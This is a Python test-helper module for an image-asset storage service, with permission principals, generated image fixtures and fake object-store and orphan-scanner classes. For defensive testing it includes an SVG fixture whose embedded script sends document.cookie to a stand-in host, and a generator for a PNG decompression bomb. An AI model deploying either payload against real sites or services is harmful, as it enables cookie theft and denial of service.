"""Test helpers shared between conftest and the test modules.

Kept out of `conftest.py` because conftest is loaded by pytest rather than imported, so
importing *from* it is fragile — this module is a plain import that works the same way
everywhere.
"""

from __future__ import annotations

import io
import uuid
from datetime import datetime

from PIL import Image

from app.config import Settings
from app.storage import ObjectStore, OrphanScanner
from platform_core.auth import Principal
from platform_core.errors import UpstreamUnavailableProblem

READ = "core.content.asset.read"
WRITE = "core.content.asset.write"


def principal_for(
    org_id: uuid.UUID, perms: list[str], *, user_id: uuid.UUID | None = None
) -> Principal:
    """The principal the gateway would have forwarded.

    There is no `subject_ref` here and that is not an omission: both asset permissions are
    ORG-only, so nothing in this service ever narrows by the caller's own identity. The
    uploader is recorded for the picker and for audit context, never as a scope input.
    """
    return Principal(
        sub=user_id or uuid.uuid4(),
        organization_id=org_id,
        membership_id=uuid.uuid4(),
        perms=perms,
        entitlements=["core"],
    )


# --------------------------------------------------------------------- image fixtures


def make_image(
    fmt: str = "JPEG",
    *,
    size: tuple[int, int] = (64, 48),
    colour: str = "red",
    **save_kwargs: object,
) -> bytes:
    """A real, decodable image of `fmt`. Generated rather than committed as a binary fixture,
    so a test that needs a 6000-pixel image or a 25 MP one just asks for it."""
    buffer = io.BytesIO()
    Image.new("RGB", size, colour).save(buffer, format=fmt, **save_kwargs)
    return buffer.getvalue()


def make_image_with_gps(fmt: str = "JPEG") -> bytes:
    """A JPEG carrying EXIF including GPS coordinates — the thing the re-encode must strip.

    A merchant's phone photo routinely carries the coordinates of their warehouse, and
    publishing that to the open internet by accident is the same class of failure as an
    unmasked bank account.
    """
    buffer = io.BytesIO()
    image = Image.new("RGB", (64, 48), "blue")
    exif = image.getexif()
    exif[0x010F] = "OpsGrids Test Camera"  # Make
    gps = exif.get_ifd(0x8825)
    gps[1] = "N"
    gps[2] = (51.0, 30.0, 0.0)
    gps[3] = "W"
    gps[4] = (0.0, 7.0, 0.0)
    image.save(buffer, format=fmt, exif=exif)
    return buffer.getvalue()


def decompression_bomb(pixels_wide: int = 9000, pixels_high: int = 9000) -> bytes:
    """A small PNG that decodes to far more pixels than its byte count suggests.

    81 megapixels of flat colour compresses to a handful of kilobytes, which is exactly why a
    byte limit does not cover this and `Image.MAX_IMAGE_PIXELS` has to.
    """
    buffer = io.BytesIO()
    Image.new("RGB", (pixels_wide, pixels_high), "white").save(buffer, format="PNG")
    return buffer.getvalue()


SVG_BYTES = (
    b'<?xml version="1.0"?>\n'
    b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    b'<script>fetch("https://evil.example/"+document.cookie)</script>'
    b'<rect width="100" height="100" fill="red"/></svg>'
)


# --------------------------------------------------------------------- the fake store


class FakeObjectStore(ObjectStore):
    """An `ObjectStore` that records instead of writing.

    Subclasses the real one so the public surface cannot drift: a method added to `ObjectStore`
    and not overridden here would reach for a boto3 client and fail loudly in the unit suite,
    rather than being silently untested.
    """

    def __init__(self, cfg: Settings) -> None:
        super().__init__(cfg)
        self.objects: dict[str, tuple[bytes, str]] = {}
        self.deleted: list[str] = []
        self.fail_put = False
        self.fail_delete = False

    async def put(
        self,
        key: str,
        data: bytes,
        *,
        content_type: str,
        organization_id: uuid.UUID,
    ) -> None:
        if self.fail_put:
            raise UpstreamUnavailableProblem(
                "Could not store the image right now. Please try again."
            )
        self.objects[key] = (data, content_type)

    async def delete(self, key: str, *, organization_id: uuid.UUID) -> None:
        if self.fail_delete:
            raise UpstreamUnavailableProblem(
                "Could not take the image down right now. Please try again."
            )
        # Mirrors S3: deleting a key that is not there is success, not an error.
        self.objects.pop(key, None)
        self.deleted.append(key)


class FakeOrphanScanner(OrphanScanner):
    """An `OrphanScanner` that lists and deletes against an in-memory dict rather than a real
    bucket — the orphan sweep's own `store` analogue, so its discovery and deletion logic can
    be exercised without `make infra`. `test_storage_minio.py` is where the real,
    list-capable credential and a genuine `ListObjectsV2` are proven; neither test substitutes
    for the other, the same split `FakeObjectStore` documents for the write path.
    """

    def __init__(self, cfg: Settings) -> None:
        super().__init__(cfg)
        self.objects: dict[str, tuple[datetime, int]] = {}
        self.deleted: list[str] = []
        self.fail_list = False
        self.fail_delete = False

    def seed(self, key: str, *, last_modified: datetime, size: int = 1024) -> None:
        self.objects[key] = (last_modified, size)

    def is_configured(self) -> bool:
        return True

    async def list_objects(self) -> list[tuple[str, datetime, int]]:
        if self.fail_list:
            raise UpstreamUnavailableProblem("Could not list the bucket right now.")
        return [(key, last_modified, size) for key, (last_modified, size) in self.objects.items()]

    async def delete(self, key: str, *, organization_id: uuid.UUID) -> None:
        if self.fail_delete:
            raise UpstreamUnavailableProblem("Could not take the image down right now.")
        self.objects.pop(key, None)
        self.deleted.append(key)
